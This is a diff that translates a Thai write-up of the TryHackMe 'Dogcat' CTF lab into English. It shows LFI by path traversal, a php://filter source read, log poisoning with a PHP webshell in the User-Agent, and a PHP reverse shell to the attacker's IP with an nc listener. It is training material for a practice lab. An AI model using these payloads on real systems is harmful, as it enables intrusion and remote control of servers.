@@ -1,61 +1,59 @@
-## ✨ บทนำ
-ยินดีต้อนรับสู่บทวิเคราะห์ห้อง CTF "Dogcat" ที่เราจะสำรวจวิธีการเจาะระบบด้วย LFI และการยกระดับสิทธิ์แบบเจาะลึก 🐾
-ห้อง Dogcat เป็นห้อง CTF ที่เน้นการโจมตีผ่านช่องโหว่ Local File Inclusion (LFI) และการยกระดับสิทธิ์ในระบบ โดยมีเป้าหมายหลักคือการเจาะระบบและอ่านไฟล์ flag ที่ซ่อนอยู่
+## ✨ Introduction
+Welcome to the "Dogcat" CTF room analysis, where we'll explore LFI exploits and privilege escalation in depth. 🐾
+The Dogcat room is a CTF room focused on attacks using Local File Inclusion (LFI) vulnerabilities and privilege escalation. The primary goal is to hack the system and read the hidden flag file.
 
-## 🎯 เป้าหมายของโจทย์
-- **เจาะระบบเว็บเซิร์ฟเวอร์**
-  - ใช้ช่องโหว่ Local File Inclusion (LFI) เพื่อเข้าถึงระบบ
-  - ยกระดับสิทธิ์จากผู้ใช้เว็บ (`www-data`) เป็นผู้ดูแลระบบ (`root`)
-- **ค้นหาและอ่านไฟล์ Flag ทั้ง 4 ใบ**
+## 🎯 Challenge Objectives
+- **Breach the web server**
+- Use the Local File Inclusion (LFI) vulnerability to gain system access
+- Escalate privileges from web user (`www-data`) to administrator (`root`)
+- **Find and read all four flag files**
 
 # 🧠 TryHackMe - Dogcat 🐶🐱
 
-> 🟡 หมวด: Web / Privilege Escalation  
-> 🧩 ความยาก: Medium  
-> 🕵️‍♂️ โหมด: CTF แบบ Capture The Flag  
-> 🧩 URL: [Dogcat](https://tryhackme.com/room/dogcat)  
-> 👨‍💻 ผู้ทำ: Thanyakorn
+> 🟡 Category: Web / Privilege Escalation
+> 🧩 Difficulty: Medium
+> 🕵️‍♂️ Mode: Capture the Flag CTF
+> 🧩 URL: [Dogcat](https://tryhackme.com/room/dogcat)
+> 👨‍💻 Author: Thanyakorn
 
 ---
+## 📚 Table of Contents
 
-## 📚 สารบัญ
+- 🛰️ 1. Basic Information 📡 (Target Info)
+- 🚀 2. Detailed Attack Procedure
+- 🛠️ 2.1 Begin exploiting the system with LFI (Local File Inclusion)
+- 🧪 2.2 Use php://filter to view the source code
+- 🔍 2.3 Analyze the Base64-converted index.php
+- 🧩 2.4 Bypass the .php extension with the ext parameter
+- ☣️ 2.5 Begin the Log Poisoning process
+- 📂 2.6 Access the log file to prepare to exploit the LFI vulnerability with Log Poisoning
+- 💉 2.7 Place the PHP payload via the User-Agent (Log Poisoning)
+- 🧫 2.8 Invoke the Webshell via LFI to test the whoami command
+- 🐚 2.9 Prepare the Reverse Shell with PHP
+- 🧬 2.10 Convert the payload and embed it in the log
+- 🧨 2.11 Embed the payload and wait for the reverse shell
+- 🏳️‍🌈 2.12 Find the first flag (flag1)
+- 🏁 2.13 Find the second flag (flag2)
+- 🔓 2.14 Privilege Escalation to root
+- 🐳 2.15 Check the environment and search for additional clues
+- 📦 2.16 Analyze the system backup file
+- 🧨 2.17 Exploit via backup.sh to escape the container
+- 🏴‍☠️ 2.18 Control the host and find the last flag (flag4.txt)
 
-- 🛰️ 1. ข้อมูลเบื้องต้น 📡 (Target Info)
-- 🚀 2. ขั้นตอนการโจมตีแบบละเอียด
-  - 🛠️ 2.1 เริ่มต้นเจาะระบบด้วย LFI (Local File Inclusion)
-  - 🧪 2.2 ใช้ php://filter เพื่อดู Source Code
-  - 🔍 2.3 วิเคราะห์ index.php ที่ถูกแปลงจาก Base64
-  - 🧩 2.4 Bypass ส่วนขยาย .php ด้วยพารามิเตอร์ ext
-  - ☣️ 2.5 เริ่มกระบวนการ Log Poisoning
-  - 📂 2.6 เข้าถึงไฟล์ Log เพื่อเตรียมใช้ช่องโหว่ LFI ร่วมกับ Log Poisoning
-  - 💉 2.7 วาง PHP Payload ผ่าน User-Agent (Log Poisoning)
-  - 🧫 2.8 เรียกใช้ Webshell ผ่าน LFI เพื่อทดสอบคำสั่ง whoami
-  - 🐚 2.9 เตรียม Reverse Shell ด้วย PHP
-  - 🧬 2.10 แปลง Payload ให้พร้อมฝังลง Log
-  - 🧨 2.11 ฝัง Payload และรอรับ Reverse Shell
-  - 🏳️‍🌈 2.12 ค้นหา Flag แรก (flag1)
-  - 🏁 2.13 ค้นหา Flag ที่สอง (flag2)
-  - 🔓 2.14 Privilege Escalation สู่ root
-  - 🐳 2.15 ตรวจสอบสิ่งแวดล้อมและค้นหาเบาะแสเพิ่มเติม
-  - 📦 2.16 วิเคราะห์ไฟล์สำรองข้อมูลในระบบ
-  - 🧨 2.17 Exploit ผ่าน backup.sh เพื่อ Escape Container
-  - 🏴‍☠️ 2.18 ควบคุม Host และค้นหา Flag สุดท้าย (flag4.txt)
- 
 ---
-
-## 🛰️ 1. ข้อมูลเบื้องต้น 📡 (Target Info)
-- IP เครื่องเป้าหมาย: `10.10.85.123`
+## 🛰️ 1. Basic Information 📡 (Target Info)
+- Target IP: `10.10.85.123`
 - Web servers: Apache Web Server
 
-## 🚀 2. ขั้นตอนการโจมตีแบบละเอียด 
+## 🚀 2. Detailed Attack Steps
 
-### 🛠️ 2.1 เริ่มต้นเจาะระบบด้วย LFI (Local File Inclusion)
+### 🛠️ 2.1 Begin Penetrating the System with LFI (Local File Inclusion)
 
-1. อย่างแรกเลย เข้าไปที่หน้าเว็บด้วย IP ที่โจทย์ให้แล้วเราจะเจอกับหน้าเว็บหลักที่ดูเหมือนเป็นเว็บเกี่ยวกับหมาแมว (Dog / Cat)
+1. First, visit the webpage using the given IP address. You'll be presented with a main page that appears to be a website about dogs and cats (Dog/Cat).
 
 ![dogcat](images/1.png)
 
-2. จากที่โจทย์บอกว่าเว็บนี้เขียนด้วย PHP และเราสงสัยว่าอาจจะมี LFI เราเลยลองยิง Payload เพื่อทดสอบ LFI แบบ Directory Traversal ด้วย URL นี้:
+2. Since the webpage is written in PHP, and we suspect LFI, we fire a payload to test LFI via directory traversal with this URL:
 
 ```bash
 http://10.10.85.123/?view=dog/../../../../etc/passwd
@@ -63,71 +61,71 @@ http://10.10.85.123/?view=dog/../../../../etc/passwd
 
 ![dogcat](images/2.png)
 
-- ใช้ ../../../../ เพื่อพยายามออกจากโฟลเดอร์ /dog/ แล้วเข้าไปอ่านไฟล์ /etc/passwd
-- แต่ปรากฏว่าเจอ Error ขึ้นมาว่า:
+- Use ../../../../ to attempt to exit the /dog/ folder and access the /etc/passwd file.
+- However, we encounter an error:
 > failed to open stream: No such file or directory in /var/www/html/index.php
 
-3. จาก Error นี้ทำให้เรารู้ว่า Web กำลังเรียกใช้ไฟล์ `index.php` และมีการ include ไฟล์ที่รับมาจาก user
-ซึ่งแปลว่าแอปนี้น่าจะใช้พวก `include()` หรือ `require()` แล้วเอาค่าจากพารามิเตอร์ `view` ไปต่อ path
+3. From this error, we know that the web is calling the file `index.php` and is including the file received from the user.
+This means that the app probably uses `include()` or `require()` and appends the value from the `view` parameter to the path.
 
-4. ทีนี้เราสงสัยว่าทำไมมันถึงเปิดไฟล์ไม่ได้ ทั้งที่ `/etc/passwd` ก็น่าจะมี
-→ อาจจะเพราะ Web เติม `.php` ต่อท้ายให้อัตโนมัติ เช่น `/etc/passwd.php` (ซึ่งไม่มีจริงเลย Error)
+4. Now, we wonder why the file can't be opened, even though `/etc/passwd` should be there.
+→ It might be because the web appends `.php` automatically, such as `/etc/passwd.php` (which doesn't exist, resulting in an error).
 
-5. เพื่อพิสูจน์ว่า Web นี้กำลังทำงานยังไง และเข้าใจ Logic ด้านหลัง
-เราจึงต้องพยายาม อ่าน source code ของ index.php
+5. To verify how the web is working and understand the logic behind it,
+we need to read the source code of index.php.
 
-### 🧪 2.2 ใช้ php://filter เพื่อดู Source Code
+### 🧪 2.2 Use php://filter to view the source code.
 
-6. ถ้าเราจะอ่านไฟล์ PHP ตรง ๆ มันจะถูก execute ทันที (Run ไม่ได้อ่าน)
-ดังนั้นต้องใช้ `php://filter` ที่เอาไว้ "กรองไฟล์ก่อนแสดงผล" และแปลงให้อยู่ในรูปแบบ Base64 แทน
+6. If we were to read the PHP file directly, it would be executed immediately (not read).
+Therefore, we need to use `php://filter` is used to "filter files before displaying them" and convert them to Base64 format instead.
 
-7. ยิง Payload นี้ไป:
+7. Fire this payload:
 
 ```bash
 http://10.10.85.123/?view=php://filter/convert.base64-encode/resource=dog/../index
 ```
 
-- `php://filter`: stream wrapper ของ PHP
-- `convert.base64-encode`: ให้ผลลัพธ์เป็น Base64
-- `dog/../index`: ย้อนกลับมาจาก `/dog/` แล้วเข้าไปยัง `index` (จริง ๆ ก็คือ index.php)
+- `php://filter`: PHP stream wrapper
+- `convert.base64-encode`: Output in Base64
+- `dog/../index`: Return from `/dog/` and into `index` (actually index.php)
 
 ![dogcat](images/3.png)
 
-8. เมื่อยิง URL นี้แล้ว เราจะได้เนื้อหาแบบ Base64 กลับมา
+8. When you fire this URL, you'll get the Base64 content back.
 
-   → ให้ copy ข้อความที่ได้แล้วเอาไปวางในเว็บ [CyberChef](https://gchq.github.io/CyberChef/)
+→ Copy the resulting text and paste it into your website. [CyberChef](https://gchq.github.io/CyberChef/)
 
-9. ตั้งค่า CyberChef ให้ใช้ Recipe เป็น `From Base64` ก็จะได้ Source code ของ `index.php` ออกมา
+9. Set CyberChef to use Recipes with `From Base64`, and the source code for `index.php` will be output.
 
 ![Cyberchef](images/4.png)
 
-### 🔍 2.3 วิเคราะห์ index.php ที่ถูกแปลงจาก Base64
+### 🔍 2.3 Analyzing the Base64-converted index.php
 
-10. หลังจากยิง Payload `php://filter` แล้ว เราจะได้ข้อความยาว ๆ ที่ถูกเข้ารหัส Base64 กลับมา
+10. After firing the `php://filter` payload, we will receive a long Base64-encoded string.
 
-11. เมื่อดูจากโค้ดที่ได้มา จะเห็นว่า:
-    - มีการใช้ตัวแปร `$ext` เพื่อเก็บ "นามสกุลของไฟล์"
-    - ตัวเว็บจะ เติม `.php` เข้าไปให้โดยอัตโนมัติ เสมอ
-    - ดูเหมือนว่า View ที่เราส่งเข้าไป (เช่น dog หรือ cat) จะเป็น input หลักที่เว็บนำไปใช้ในการ include ไฟล์
-      
-   ตัวอย่างเช่น:
+11. Looking at the resulting code, we can see that:
+- The `$ext` variable is used to store the "file extension".
+- The website will always automatically append `.php`.
+- It appears that the view we submit (such as dog or cat) is the primary input used by the website to include the file.
+
+For example:
 
 ```bash
 include($_GET["view"] . $ext);
 ```
-→ แปลว่า ถ้าเราส่ง `view=dog/../../../../etc/passwd` เว็บจะพยายาม include:
-`dog/../../../../etc/passwd.php` → ซึ่งไม่มีจริง ก็เลย Error
+→ This means that if we pass `view=dog/../../../../etc/passwd`, the website will try to include:
+`dog/../../../../etc/passwd.php` → which doesn't exist, resulting in an error.
 
-### 🧩 2.4 Bypass ส่วนขยาย `.php` ด้วยพารามิเตอร์ ext
-  
-12. จาก Source Code ที่ถอด Base64 มา เราเห็นว่าเว็บจะเติม `.php` ต่อท้ายไฟล์ทุกครั้ง ผ่านตัวแปร `$ext`
-→ ทำให้ไม่สามารถอ่านไฟล์อย่าง `/etc/passwd` หรือ `index` ตรง ๆ ได้ เพราะมันจะกลายเป็น `index.php` เสมอ
+### 🧩 2.4 Bypassing the `.php` extension with the ext parameter
 
-13. ใช้เทคนิค Bypass .php extension ด้วย ext=
-- จาก source code ที่อ่านได้ก่อนหน้า เราทราบว่าเว็บใช้ `$ext = '.php'` เพื่อเติมนามสกุลไฟล์
-- เราสามารถ "ลบ" การเติมนามสกุล `.php` นี้โดยการระบุตัวแปร `ext` แต่ไม่ใส่ค่าเข้าไป
+12. From the Base64-stripped source code, we see that the website appends `.php` to the end of every file via the `$ext` variable.
+→ This prevents files like `/etc/passwd` or `index` from being read directly, as they will always become `index.php`.
 
-🔧 Payload ที่ใช้:
+13. Use the technique of bypassing the .php extension with ext=
+- From the previously read source code We know that the website uses `$ext = '.php'` to prepend the file extension.
+- We can "remove" this `.php` prependency by specifying the `ext` variable but leaving it blank.
+
+🔧 Payload used:
 
 ```bash
 http://10.10.85.123/?view=dog/../../../../etc/passwd&ext=
@@ -135,87 +133,87 @@ http://10.10.85.123/?view=dog/../../../../etc/passwd&ext=
 
 ![dogcat](images/5.png)
 
-📌 สิ่งที่เกิดขึ้นคือ:
+📌 What happens is:
 
- - ตอนนี้ PHP จะพยายาม include ไฟล์จาก path ที่เราระบุ โดย ไม่มีการเติม `.php` ต่อท้ายอีกต่อไป
- - นั่นแสดงว่า การ Bypass .php สำเร็จ และเราสามารถใช้ LFI ได้แบบเต็มรูปแบบ
+- PHP will now attempt to include files from the path we specified without the `.php` prependency.
+- This indicates that the .php bypass was successful and we can now fully use LFI.
 
-📍หลังจากทดสอบว่าเราสามารถอ่านไฟล์ได้แล้ว ขั้นตอนต่อไปคือการเปิด Burp Suite เพื่อเริ่มวาง Payload สำหรับ Log Poisoning หรือการฝัง PHP Code ผ่าน Access Log
+📍After testing that we can read the file, The next step is to launch Burp Suite to begin deploying the Log Poisoning payload, or embedding PHP code through the Access Log.
 
-### ☣️ 2.5 เริ่มกระบวนการ Log Poisoning
+### ☣️ 2.5 Starting the Log Poisoning Process
 
-14. เป้าหมายของเราคือการ ฝังโค้ด PHP ลงใน access log แล้วใช้ช่องโหว่ LFI ที่มีอยู่เพื่อ เรียกใช้งานโค้ดนั้นจากไฟล์ log
+14. Our goal is to embed PHP code into the access log and then exploit the existing LFI vulnerability to execute that code from the log file.
 
-15. สิ่งที่ต้องทำคือ:
+15. Here's what you need to do:
 
-🔧 15.1 เปิด Proxy และเตรียม Burp Suite
-- เปิด Burp Suite ขึ้นมา
-- เปิด Browser ที่ตั้งค่าให้ใช้ Proxy ของ Burp (เช่น Firefox)
-- เข้าเว็บเป้าหมาย (`http://10.10.85.123/`) เพื่อให้ Burp ดัก Request ได้
+🔧 15.1 Launch a proxy and prepare Burp Suite
+- Launch Burp Suite.
+- Open a browser configured to use Burp's proxy (e.g., Firefox).
+- Visit the target website. (`http://10.10.85.123/`) to allow Burp to intercept requests.
 
 ![proxy](images/6.png)
 
-📩 15.2 ส่ง Request ไปยัง Repeater
+📩 15.2 Send Requests to Repeater
 
-- หลังจากโหลดหน้าเว็บแล้ว กลับมาที่ Burp → ไปที่แท็บ **HTTP history**
-- คลิกขวาที่ Request ที่เราต้องการ → เลือก **Send to Repeater**
+- After loading the web page, return to Burp → go to the **HTTP History** tab.
+- Right-click on the desired request → select **Send to Repeater**.
 
-### 📂 2.6 เข้าถึงไฟล์ Log เพื่อเตรียมใช้ช่องโหว่ LFI ร่วมกับ Log Poisoning
-🧪 16 เปลี่ยน path เป็น access log แล้วส่ง Request
-- ในแท็บ Repeater ของ Burp Suite:
-  - เปลี่ยน path ที่ parameter `view=` ให้ชี้ไปยัง log file:
-    ```bash
-    view=dog/../../../../../../var/log/apache2/access.log
-    ```
-   - จากนั้นกด Send เพื่อลองเรียกดูเนื้อหาไฟล์
+### 📂 2.6 Access the Log File to Prepare for Exploiting the LFI Vulnerability with Log Poisoning
+🧪 16 Change the path to access log and send the request.
+- In the Repeater tab of Burp Suite:
+- Change the path in the `view=` parameter to point to the log file:
+```bash
+view=dog/../../../../../../var/log/apache2/access.log
+```
+- Then click Send to try viewing the file contents.
 
 ![log](images/7.png)
 
-✅ 16.1 ตรวจสอบผลลัพธ์
-หาก Response แสดงเนื้อหาของ log เช่น บรรทัดที่เริ่มต้นด้วย IP, Request Line, หรือ User-Agent แสดงว่า สามารถเข้าถึง log ได้สำเร็จ
+✅ 16.1 Check the Results
+If the response displays log contents, such as lines beginning with IP, Request Line, or User-Agent, the log was successfully accessed.
 
-ℹ️ หมายเหตุ:
-- log ที่ใช้คือ: `/var/log/apache2/access.log` ซึ่งเป็นที่เก็บ access log ของ Apache
-- ผมใช้ Wappalyzer (Browser Extension) เพื่อตรวจสอบว่า Web Server คือ Apache และใช้ PHP
+ℹ️ Note:
+- The log used is: `/var/log/apache2/access.log`, which stores Apache's access log.
+- I used Wappalyzer (a browser extension) to verify that the web server is Apache and running PHP.
 
-🧾 วิเคราะห์ Access Logs และเตรียมใช้ User-Agent Injection
-17. ตรวจสอบบันทึกการเข้าถึง (access.log)
-- หลังจากเราใช้เทคนิค LFI เพื่อเข้าถึงไฟล์ `/var/log/apache2/access.log` ได้แล้ว
-- ให้เราสังเกตบรรทัดล่างสุดของ log ซึ่งเป็นคำขอล่าสุดที่เราส่งเข้าไปก่อนหน้า
+🧾 Analyze Access Logs and Prepare for User-Agent Injection
+17. Check the Access Log (access.log)
+- After using the LFI technique to access the `/var/log/apache2/access.log` file,
+- Let's look at the bottom line of the log, which is the most recent request we sent.
 
 ![log](images/8.png)
 
-- ตรงนี้เองที่สำคัญ: เรามองเห็น User-Agent ที่เราส่งไป
+- This is important: we can see the User-Agent we sent.
 
-🧠 วิเคราะห์:
-- บันทึก access log นี้ช่วยให้เห็นว่า server บันทึกคำขอทุกคำ รวมถึง header ต่าง ๆ เช่น `User-Agent`
-- และเพราะว่า log นี้สามารถอ่านได้ผ่านช่องโหว่ LFI นั่นหมายความว่า...
-  
-✅ หากเราส่ง PHP code ผ่าน User-Agent แล้ว server บันทึกมันไว้ → เราสามารถรวม log file นี้เพื่อรัน PHP code ได้!
+🧠 Analysis:
+- This access log shows that the server logs every request, including headers such as `User-Agent`.
+- And since this log can be read through the LFI vulnerability, this means...
 
-18. บันทึก IP ของเครื่อง Attacker
-- จากบรรทัดของ log เราจะเห็น IP ของเครื่องที่ส่ง request เข้ามา
+✅ If we send PHP code through a User-Agent and the server logs it → We can combine this log file to execute PHP code!
+
+18. Record the Attacker's IP Address
+- From the log line, we can see the IP address of the machine that sent the incoming request.
 
 ![log](images/9.png)
 
-- ในกรณีนี้คือ:
+- In this case, it's:
 
 ```bash
 10.9.0.160
 ```
 
-- ให้จด IP นี้ไว้ เพราะเราจะใช้มันในการสร้าง reverse shell กลับมาหาเครื่องเราในขั้นตอนต่อไป
+- Make a note of this IP address, as we'll use it to create a reverse shell back to our machine in the next step.
 
-### 💉 2.7 วาง PHP Payload ผ่าน User-Agent (Log Poisoning)
-> หลังจากที่เรายืนยันแล้วว่าไฟล์ `/var/log/apache2/access.log` สามารถถูกอ่านผ่าน LFI ได้ และคำร้องขอ (request) ของเราถูกบันทึกทั้งบรรทัด—including `User-Agent`—เราจะใช้ Log Poisoning เพื่อ inject โค้ด PHP ลงไปใน log file
+### 💉 2.7 Sending PHP Payload through a User-Agent (Log Poisoning)
+> After we've confirmed that the `/var/log/apache2/access.log` file can be read through LFI and our request is logged—including the entire line— `User-Agent`—We'll use Log Poisoning to inject PHP code into the log file.
 
-19. 🛠 Payload ขั้นตอนนี้
-- ในแท็บ Repeater:
-  - เราจะต้องลบตัวแทนออกไป (ตรง User-Agent)
+19. 🛠 Payload Step
+- In the Repeater tab:
+- We'll need to remove the agent (User-Agent).
 
 ![user-agent](images/10.png)
 
-20. ต่อมาเราจะแก้ไข User-Agent ให้เป็น:
+20. Next, we'll modify the User-Agent to:
 
 ```bash
 <?php system($_GET['cmd']); ?>
@@ -223,37 +221,38 @@ http://10.10.85.123/?view=dog/../../../../etc/passwd&ext=
 
 ![user-agent](images/11.png)
 
-📌 อธิบายโค้ด:
- - `<?php ... ?>` คือโค้ด PHP
- - `system($_GET['cmd']);` จะรันคำสั่ง shell ที่ถูกส่งมาผ่าน query parameter ที่ชื่อ cmd
+📌 Code Explanation:
+- `<?php ... ?>` is the PHP code.
+- `system($_GET['cmd']);` will execute the shell command passed in via the query parameter named cmd.
 
-### 🧫 2.8 เรียกใช้ Webshell ผ่าน LFI เพื่อทดสอบคำสั่ง whoami
-> หลังจากที่เราฝังโค้ด PHP (<?php system($_GET['cmd']); ?>) ลงใน log แล้วเรียบร้อย
-เป้าหมายถัดไปคือการ ทดสอบว่าเราสามารถรันคำสั่งระบบได้จริงหรือไม่
+### 🧫 2.8 Run Webshell via LFI to test the whoami command.
+> After we've embedded the PHP code (<?php system($_GET['cmd']); ?>) has been added to the log.
 
-✅ วิธีเรียกใช้ Webshell:
+The next goal is to test whether we can actually run system commands.
 
-21. วาง URL ดังนี้:
+✅ How to invoke Webshell:
+
+21. Paste the URL as follows:
 
 ```bash
 http://10.10.85.123/?view=/var/log/apache2/access.log&ext=&cmd=whoami
 ```
 
-อธิบายพารามิเตอร์:
- - `view=` → ใช้ LFI เพื่อโหลดไฟล์ log ที่เราฝังโค้ดไว้
- - `ext=` → ส่งค่าว่าง เพื่อหลีกเลี่ยงไม่ให้ระบบเติม .php เข้าไปอัตโนมัติ
- - `cmd=whoami` → สั่งให้รันคำสั่ง whoami เพื่อดูว่าเราทำงานอยู่ในสิทธิ์ของผู้ใช้ใด
+Parameter explanation:
+- `view=` → Use LFI to load the log file containing the embedded code.
+- `ext=` → Return a blank value to prevent the system from automatically adding .php.
+- `cmd=whoami` → Run the whoami command to see which user we're running with.
 
-22. หลังจากที่วาง URL ไปแล้วจากนั้นทำการ Send สังเกตุจาก Response จะเห็นว่าเราไม่เจออะไรเลย เราจำเป็นต้องกด Send อีกที ผลลัพธ์จึงจะออกมา
+22. After pasting the URL and sending, you'll see that nothing is found in the response. You'll need to click Send again to get the results.
 
 ![log](images/14.png)
 
-23. ทำไมต้องกด Send สองครั้ง?
-> หลังจากที่เรา inject โค้ด PHP ลงใน access.log และพยายามโหลดไฟล์นั้นผ่าน LFI เพื่อรันคำสั่ง เช่น whoami แล้ว
-ครั้งแรกที่เรากด Send ใน Burp Suite (หรือโหลด URL นั้นผ่านเบราว์เซอร์)
-อาจ ยังไม่เห็นผลลัพธ์ของคำสั่ง เพราะ Log file ยังไม่ถูกอัปเดตแบบ real-time ในช่วงวินาทีนั้น
+23. Why do I have to click Send twice?
+> After we inject PHP code into access.log and attempt to load that file via LFI to execute a command like whoami,
+the first time we press Send in Burp Suite (or load the URL through a browser),
+the command output may not be visible because the log file hasn't been updated in real-time for that second.
 
-เมื่อทำแบบนี้ เราจะเห็น output เป็น:
+When we do this, we see the output as:
 
 ```bash
 www-data
@@ -261,19 +260,19 @@ www-data
 
 ![log](images/15.png)
 
-แสดงว่า Webshell ของเราทำงานเรียบร้อยแล้ว และสามารถใช้คำสั่งต่อได้ เช่น ls, id, uname -a เป็นต้น
+This indicates that our webshell has successfully launched and we can now use commands such as ls, id, uname -a, etc.
 
-### 🐚 2.9 เตรียม Reverse Shell ด้วย PHP
-> หลังจากที่เราทดสอบแล้วว่าคำสั่ง `whoami` ทำงานได้ผ่าน Webshell ที่ฝังใน log (access.log)
-ขั้นตอนต่อไปคือการยิง Reverse Shell เพื่อเข้าควบคุมเครื่องเป้าหมายจากระยะไกล
+### 🐚 2.9 Preparing a Reverse Shell with PHP
+> After we've tested that the `whoami` command works via the webshell embedded in the access.log,
+the next step is to launch a Reverse Shell to remotely take control of the target machine.
 
-🔧 เครื่องมือที่ใช้:
-เราจะใช้ Pentestmonkey ซึ่งเป็นเว็บไซต์รวม Cheat Sheet สำหรับ Web Shell และ Reverse Shell
-  [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+🔧 Tools Used:
+We'll be using Pentestmonkey. This is a website that includes cheat sheets for Web Shell and Reverse Shell.
+[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
-🧾 โค้ด Reverse Shell (ภาษา PHP):
+🧾 Reverse Shell Code (PHP):
 
-24. ทำการ copy Payload ดังกล่าว:
+24. Copy the payload:
 
 ```bash
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -281,77 +280,76 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ![shell](images/16.png)
 
-- `fsockopen()` เปิดการเชื่อมต่อ TCP ไปยัง IP/Port ที่เราระบุ
-- `exec()` จะเรียกใช้งาน shell `(/bin/sh -i)` แบบ interactive
-- เมื่อฝังโค้ดนี้ลงใน Log และโหลดผ่าน LFI → เซิร์ฟเวอร์จะเชื่อมกลับมาที่เครื่องเรา
+- `fsockopen()` opens a TCP connection to the specified IP/Port.
+- `exec()` will launch an interactive shell `(/bin/sh -i)`.
+- When this code is embedded in the log and loaded via LFI, the server will connect back to your machine.
 
-⚠️ หมายเหตุ:
-- ก่อน copy โค้ดจากเว็บให้ เปลี่ยน IP (`10.0.0.1`) และ Port (`1234`) ให้เป็นของเครื่องเราจริงๆ
+⚠️ Note:
+- Before copying the code from the web, change the IP address (`10.0.0.1`) and Port (`1234`) to your actual machine.
 
-### 🧬 2.10 แปลง Payload ให้พร้อมฝังลง Log
-> หลังจากที่ได้คำสั่ง reverse shell แล้ว ขั้นตอนต่อไปคือการ encode payload เพื่อให้สามารถฝังลงใน log file ได้อย่างปลอดภัยและไม่ผิด syntax
+### 🧬 2.10 Convert the Payload to Embed in the Log
+> After the reverse shell command is created, the next step is to encode the payload so that it can be embedded safely and syntactically in the log file.
 
-25. ใช้ CyberChef:
-    
-เราจะใช้ CyberChef ซึ่งเป็นเครื่องมือออนไลน์ที่ช่วยในการเข้ารหัส/ถอดรหัส วิเคราะห์ข้อมูล ฯลฯ
+25. Using CyberChef:
 
-✅ ขั้นตอน:
-1. นำ payload ที่ได้มา:
+We will be using CyberChef, an online encryption/decryption tool. Data analysis, etc.
+
+✅ Steps:
+1. Extract the resulting payload:
 
 ```bash
 php -r '$sock=fsockopen("10.9.0.160",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-2. วางลงใน CyberChef
-3. ทางซ้ายให้ค้นหาและลากสูตร “URL Encode” เข้ามาใช้
-4. CyberChef จะแปลง payload ให้กลายเป็นรูปแบบ URL-safe
+2. Paste it into CyberChef.
+3. On the left, find and drag the "URL Encode" formula into it.
+4. CyberChef will convert the payload into URL-safe format.
 
 ![chef](images/17.png)
 
-5. คัดลอกผลลัพธ์ไปใช้ต่อในการยิงผ่าน Burp Suite
+5. Copy the results to use when firing through Burp Suite.
 
-### 🧨 2.11 ฝัง Payload และรอรับ Reverse Shell
-> หลังจากที่เราได้ Payload ที่ถูก URL-encode แล้ว ขั้นตอนต่อไปคือฝัง payload นั้นลงใน log และรอ reverse shell เชื่อมกลับมา
+### 🧨 2.11 Embed the Payload and Wait for the Reverse Shell
+> Once we have the URL-encoded payload, the next step is to embed it into the log and wait for the reverse shell to connect.
 
-26. ดำเนินการใน Burp Suite:
-- กลับไปที่ Burp Suite → แท็บ Repeater
-- เพิ่มพารามิเตอร์ `cmd=<payload>` ต่อท้าย URL
-
+26. Execute in Burp Suite:
+- Return to Burp Suite → Repeater tab
+- Add the parameter Append `cmd=<payload>` to the end of the URL
 
 ![reverse](images/18.png)
 
-27. เตรียม Listener บนเครื่องเรา:
-เปิด Terminal และรันคำสั่งเพื่อรอรับการเชื่อมต่อ:
+27. Prepare a listener on your machine:
+Open a terminal and run the following command to listen for connections:
 
 ```bash
 nc -lvnp 1234
 ```
 
-🚀 Trigger การเชื่อมต่อ:
-กลับมาที่ Burp Suite และกด Send
+🚀 Trigger the connection:
+Return to Burp Suite and press Send.
 
-📥 ถ้า payload ทำงานสำเร็จ — ใน Terminal เราจะเห็นมีการเชื่อมต่อเข้ามา
+📥 If the payload is successful, you should see an incoming connection in the terminal.
 
 ![reverse](images/19.png)
 
-✅ ยืนยัน: เมื่อเราได้ shell กลับมาแล้ว จะสามารถพิมพ์คำสั่งต่าง ๆ เช่น whoami เพื่อดูสิทธิ์ของผู้ใช้งานบนเซิร์ฟเวอร์นั้นได้ทันที
+✅ Confirm: Once you have your shell back, you can immediately type commands like whoami to view the user's permissions on that server.
 
-### 🏳️‍🌈 2.12 ค้นหา Flag แรก (flag1)
-> หลังจากที่เราได้ shell กลับมาเรียบร้อยแล้ว
+### 🏳️‍🌈 2.12 Find the first flag (flag1)
+> After you have your shell back,
 
-28. ตรวจสอบไฟล์ใน directory ปัจจุบัน:
+28. Check the files in your current directory:
 
-📥 ใช้คำสั่ง:
+📥 Use the command:
 
 ```bash
 ls
 ```
 
-📂 ผลลัพธ์: พบไฟล์ `flag.php`
+📂 Result: The file `flag.php` was found.
 
-📖 อ่านเนื้อหาของ flag:
+📖 Read the contents of the flag:
 
-📥 ใช้คำสั่ง:
+📥 Use the command:
 
 ```bash
 cat flag.php
@@ -359,23 +357,23 @@ cat flag.php
 
 ![flag1](images/20.png)
 
-📄 จากนั้นคัดลอกเนื้อหาของ flag และนำไปกรอกในช่องคำตอบบน TryHackMe
+📄 Then, copy the contents of the flag and paste it into the answer field on TryHackMe.
 
-✅ เสร็จสิ้นการเก็บ flag1
+✅ Finished collecting flag1
 
-### 🏁 2.13 ค้นหา Flag ที่สอง (flag2)
-> หลังจากเก็บ flag1 ได้แล้ว เราจะไปตามหา flag ต่อไป
+### 🏁 2.13 Find the second flag (flag2)
+> After collecting flag1, we'll go look for flag Next
 
-29. เปลี่ยนไดเรกทอรีกลับไปหนึ่งระดับ:
+29. Change directory one level back:
 
 ```bash
 cd ..
 ls
 ```
 
-📁 ผลลัพธ์: พบไฟล์ชื่อ `flag2_QMW7JvaY2LvK.txt`
+📁 Result: Found a file named `flag2_QMW7JvaY2LvK.txt`
 
-📖 อ่านเนื้อหา flag2:
+📖 Read the contents of flag2:
 
 ```bash
 cat flag2_QMW7JvaY2LvK.txt
@@ -383,14 +381,14 @@ cat flag2_QMW7JvaY2LvK.txt
 
 ![flag2](images/21.png)
 
-📄 คัดลอกค่า flag ที่แสดงออกมา แล้วนำไปกรอกในระบบของ TryHackMe
+📄 Copy the displayed flag values and paste them into the TryHackMe system.
 
-✅ เสร็จสิ้นการเก็บ flag2
+✅ Finished saving flag2
 
-### 🔓 2.14 Privilege Escalation สู่ root 
